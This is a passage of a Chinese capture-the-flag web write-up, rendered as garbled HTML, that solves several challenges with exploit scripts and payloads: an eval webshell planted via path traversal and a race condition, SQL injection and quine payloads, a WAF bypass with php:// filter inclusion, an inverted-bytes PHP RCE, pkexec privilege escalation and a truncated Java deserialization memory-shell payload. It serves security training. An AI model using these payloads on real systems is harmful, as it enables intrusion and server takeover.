alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨navigate_upload.phpä¸­å­˜åœ¨æ¼æ´ï¼Œæ¥ç€ç»§ç»­çœ‹ä¸‹è¡¥ä¸ã€‚<br><img src="https://img-blog.csdnimg.cn/58cfb24f5dce4667a701d73d3a4ec244.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¡¥ä¸ä¸­å°†è¿™ä¸€æ•´ä¸ªifå…¨éƒ¨åˆ é™¤äº†ï¼Œçœ‹æ¥æ¼æ´ç‚¹å°±æ˜¯è¿™ä¸ªåœ°æ–¹äº†ã€‚<br>å¹¶ä¸”gitè·å–åˆ°çš„æºç ä¸­ä¹Ÿç¡®å®å­˜åœ¨è¿™æ®µä»£ç ã€‚<br>ç®€ç­”åˆ†æä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/a7dd22dad61a4184b073fd84d7f9b74b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥å°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œä½†æ˜¯è¿˜è¦ä¼ ä¸ªidï¼Œå¹¶ä¸”æœ€ç»ˆæ‹¼æ¥æˆäº†è·¯å¾„æ˜¯å·²å­˜åœ¨çš„æ–‡ä»¶ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¦†ç›–å·²æœ‰æ–‡ä»¶ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–ä¸€ä¸ªphpæ–‡ä»¶ã€‚é¦–é¡µé‡Œé¢æœ‰ä¸ªnavigate_info.phpè²Œä¼¼æ²¡ä»€ä¹ˆç”¨ã€‚å°±è¦†ç›–ä»–äº†ã€‚<br>é—®é¢˜æ¥äº†ï¼Œå¯¹ä¼ å…¥çš„idè¿›è¡Œäº†æ›¿æ¢ï¼Œå°†â€¦&#x2F;æ›¿æ¢æˆäº†ç©ºã€‚<br>ä¸è¿‡ä¸è¦ç´§ï¼Œå¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡çš„æ–¹å¼ã€‚<br>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">sess=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.116/&quot;</span></span><br><span class="line">r1=sess.get(url+<span class="string">&#x27;login.php&#x27;</span>,headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&quot;navigate-user=\\&#x27;||1#&quot;</span>&#125;)</span><br><span class="line">url=url+<span class="string">&quot;navigate_upload.php?session_id=31pukck2gfik0s84750cbvrdq2&amp;engine=picnik&amp;id=....//....//....//navigate_info.php&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">r=sess.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br></pre></td></tr></table></figure><p>é€šè¿‡èšå‰‘è¿æ¥åå‘ç°æ²¡æœ‰flagæ–‡ä»¶ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/a2e1f1bbc3bb46f1a80a3ba68495d401.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰§è¡Œåæ²¡æœ‰å‡ºflagã€‚<br>æ‰“å¼€è¿™ä¸ªæ–‡ä»¶çœ‹ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/7cbf495615944cf3afa0c2326716ca47.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åº”è¯¥æ˜¯éœ€è¦åˆ é™¤æ‰ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„bocai.htmlã€bocai.pngï¼Œç„¶åå†æ¥æ‰§è¡Œï¼Œä¸è¿‡æš‚æ—¶æ²¡æœ‰åˆ é™¤çš„æƒé™ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯éœ€è¦ææƒäº†ã€‚</p><p>åˆ©ç”¨ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null å‘½ä»¤å‘ç°æœ‰ pkexec<br><img src="https://img-blog.csdnimg.cn/496728cf6b5e4859b881a3bdac7fc523.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›´æ¥ç”¨ CVE-2021-4034 è¿›è¡Œææƒ<br><img src="https://img-blog.csdnimg.cn/54667e18bd254e3ba8495678382ddfce.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹å‘ç° bocai.html å’Œ bocai.png ä¸èƒ½åˆ ã€ä¸èƒ½ç§»åŠ¨ï¼Œåˆ©ç”¨ chattr -a bocai* å‘½ä»¤å»é™¤è¯¥å±æ€§å³å¯ã€‚<br><img src="https://img-blog.csdnimg.cn/349d39ba41c04ccfb126312e917b707b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰§è¡Œ .&#x2F;I_want_capture_the_flag æ‹¿åˆ° flag:<br><img src="https://img-blog.csdnimg.cn/ef8313202716436db7ffdb3ba9af249a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="easygo-airrudder"><a href="#easygo-airrudder" class="headerlink" title="easygo (airrudder)"></a>easygo (airrudder)</h2><p>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ go.modï¼Œé‡Œé¢æœ‰ä¸ª github åœ°å€<br><img src="https://img-blog.csdnimg.cn/a0405132f84c48d3b1a79dca7f752e6e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹å‘ç°å°±æœ‰åˆ©ç”¨æ–¹å¼<br><img src="https://img-blog.csdnimg.cn/67b57d1e076b42a5b5448d39acf69e4b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.115:8080/juice/1&#x27; UNION SELECT 1,flag FROM super_secret_table--+ </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c064023fa41045c0907f7032b69fc175.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ç®€å•åŒ…å«-yu22x"><a href="#ç®€å•åŒ…å«-yu22x" class="headerlink" title="ç®€å•åŒ…å« (yu22x)"></a>ç®€å•åŒ…å« (yu22x)</h2><p>æ­£å¸¸æäº¤ä¼ªåè®®å‘ç°å­˜åœ¨waf<br><img src="https://img-blog.csdnimg.cn/5b2b97fb4d0240e69e4445d47869c186.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»è¿‡åå¤æµ‹è¯•ï¼Œæäº¤ä¸€å®šæ•°é‡çš„å‚æ•°å³å¯ç»•è¿‡<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php </span><br></pre></td></tr></table></figure><h2 id="can-u-login-airrudder"><a href="#can-u-login-airrudder" class="headerlink" title="can_u_login (airrudder)"></a>can_u_login (airrudder)</h2><p>è·Ÿç¬¬äº”ç©ºé—´çš„ yet_another_mysql_injection è¿™é“é¢˜ä¸€æ ·ï¼Œç”¨çš„æ˜¯ sqli quineï¼Œpayload ä¹Ÿä¸€æ ·:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="string">&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;</span>&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;<span class="number">1</span>&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;<span class="number">1</span>&quot;)%23&#x27;,CHAR(34),CHAR(39)),CHAR(49),&#x27;&quot;<span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(&quot;1&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">49</span>),&quot;1&quot;)<span class="operator">%</span><span class="number">23</span><span class="string">&#x27;)%23 </span></span><br></pre></td></tr></table></figure><h2 id="ç®€å•çš„php-airrudder"><a href="#ç®€å•çš„php-airrudder" class="headerlink" title="ç®€å•çš„php (airrudder)"></a>ç®€å•çš„php (airrudder)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„æ— å‚RCEï¼Œç„¶åè¿˜ä¸èƒ½æœ‰æ•°å­—å­—æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨å–åç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// phpinfo çš„å€¼</span><br><span class="line">?code=[~%8f%97%8f%96%91%99%90][!%FF](); </span><br></pre></td></tr></table></figure><p>åŒæ ·çš„æ‰‹æ®µï¼Œæ„é€ å‡º <code>system(current(getallheaders()));</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bd522c23b9b44f908e5c550c234f4383.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‹ç¼©åŒ…-yu22x"><a href="#å‹ç¼©åŒ…-yu22x" class="headerlink" title="å‹ç¼©åŒ… (yu22x)"></a>å‹ç¼©åŒ… (yu22x)</h2><p>é¢˜ç›®å…³é”®çš„åœ°æ–¹å¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/a19400f4d43c4b339cd066a8e558b721.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°†æˆ‘ä»¬ä¸Šä¼ çš„å†…å®¹å†™åˆ°&#x2F;tmpä¸‹ï¼Œæ¥ç€ä½œä¸ºå‹ç¼©åŒ…è§£å‹ï¼Œç„¶åç»è¿‡ä¸€å †è¿‡æ»¤åå¦‚æœä¸æ»¡è¶³åˆ™åˆ é™¤æ–‡ä»¶ã€‚<br>è¿™æ ·å°±ä¼šå­˜åœ¨æ¡ä»¶ç«äº‰çš„å¯èƒ½ï¼Œå¹¶ä¸”è§£å‹åç”Ÿæˆçš„æ–‡ä»¶è·¯å¾„å¯ä»¥é€šè¿‡è®¡ç®—è·å¾—ã€‚<br>1ã€å°†å¦‚ä¸‹phpå†…å®¹å‹ç¼©ç”Ÿæˆzipæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;11111&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/x.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>2ã€æ¡ä»¶ç«äº‰è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.110:8521/&quot;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;a.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">content=base64.b64encode(s)</span><br><span class="line">data=&#123;<span class="string">&#x27;content&#x27;</span>:content&#125;</span><br><span class="line">i = hashlib.md5(content)</span><br><span class="line">md=hashlib.md5((<span class="string">&#x27;/tmp/&#x27;</span>+<span class="built_in">str</span>(i.digest().<span class="built_in">hex</span>())).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post( url,data=data )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">f&#x27;static/upload/<span class="subst">&#123;md&#125;</span>/a.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>() </span><br></pre></td></tr></table></figure><p>é€šè¿‡èšå‰‘è¿æ¥x.phpå¯†ç ä¸º1<br>æ ¹ç›®å½•ä¸‹æ‹¿åˆ°flag</p><h2 id="easy-sql-yu22x"><a href="#easy-sql-yu22x" class="headerlink" title="easy_sql (yu22x)"></a>easy_sql (yu22x)</h2><p>æ‰«æåå°å‘ç°phpmyadmin<br><img src="https://img-blog.csdnimg.cn/4a4e025dc69c494fbc0b32bf4428ee53.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç™»å½•éœ€è¦å¯†ç ï¼Œç›²çŒœç”¨æˆ·åroot<br>è¯•äº†å‡ ä¸ªå¼±å£ä»¤ã€‚<br>å‘ç°å¯†ç ä¸ºpasswordæ—¶ç™»å½•æˆåŠŸï¼Œä¼°è®¡æ˜¯éé¢„æœŸäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/cc2a0aced10e44ba84e124d1cde7a6e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç”¨æˆ·åæŒ¨ä¸ªè¯•äº†ä¸€éï¼Œå‘ç°ä½¿ç”¨ç”¨æˆ·åä¸ºSuperF1@gç™»å½•æ—¶ç›´æ¥å‡ºflagäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/675d808f9a7940c09dac99e0b3aca097.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Ez-Java-xenny"><a href="#Ez-Java-xenny" class="headerlink" title="Ez_Java(xenny)"></a>Ez_Java(xenny)</h2><p>ysoserialä¸å‡ºç½‘<code>http://novic4.cn/index.php/archives/26.html#cl-4</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lab4exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,Integer&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAANpHK/rq+AAAAMgKlCgC5AV8IAWAJAKIBYQgAvQkAogFiBwFjCgAGAV8KAAYBZAoABgFlCgCiAWYJAKIBZwgBaAoBaQFqCgAhAWsKACEBbAoBaQFtBwFuCgFpAW8KABEBcAoAEQFxCgAhAXIHAXMIAXQKAB4BdQgBdgoAHgF3CgF4AXkKACABeggBewcBfAcA2AcBfQcBfggBfwoAHgGACAGBCAGCCAGDCAGECAGFBwGGBwGHCAGICwApAYkIAYoKACEBiwcBjAcBjQgA8QcBjgcBjwgA8wgBkAgA9woAIQGRCAGSCgGTAZQKACEBlQgBlgoAIQGXCAGYCAGZCAGaBwGbCgGcAZ0KAZwBngoBnwGgCgBAAaEIAaIKAEABowoAQAGkCgAyAaUKAaYBpwgBqAsAKQGpCAGqCgAhAasHAawKAE4BXwoALwGtCAElCgBOAa4IAScIAQ4LACkBrwoBsAGxCAGyCgAeAbMKAbQBtQoBtAG2BwG3CAEEBwG4CgBdAbkIAQgHAboKAGABuwsBvAG9CwG+Ab8LAb4BwAcBwQsAZQHCCAHDCAHECgAhAcULAGUBxgcBxwoAawHICAHJCgBrAcoIAcsIAcwLAc0BzggBzwoB0AHRBwHSCgB0AdMKAdAB1AgB1QgB1gkB1wHYCgAeAdkKAXgBtQcB2goAfAFfCgB8AdsKAdAB3AoB3QHeCgHdAd8KAdcB4AoAIAGrCAHhCwApAeIKAKIB4woAogHkCQCiAeUHAeYHAecKAIkB6AcB6QcB6goAjQFfCwAqAaUKACEB6woBpgHsCgAgAWUKAI0B7QoAogHuCgAhAe8LAfAB8QgB8goBkwHzCgAGAfQIAfUHAfYKAJsB9wsB+AH5BwH6CgAeAfsIAU8HAfwHAqMKAKIBXwcB/goApAFfCgCkAf8KAKQCAAoAHgIBCgCkAgIKAJ4CAwcCBAoAqwFfCgCrAgUKAKsCAAkCBgIHCgIGAggKAKsCCQoAngIKBwILBwIMCgAeAg0KAg4BtQoCDgIPCwChAa4HAhAHAhEBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZDsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEA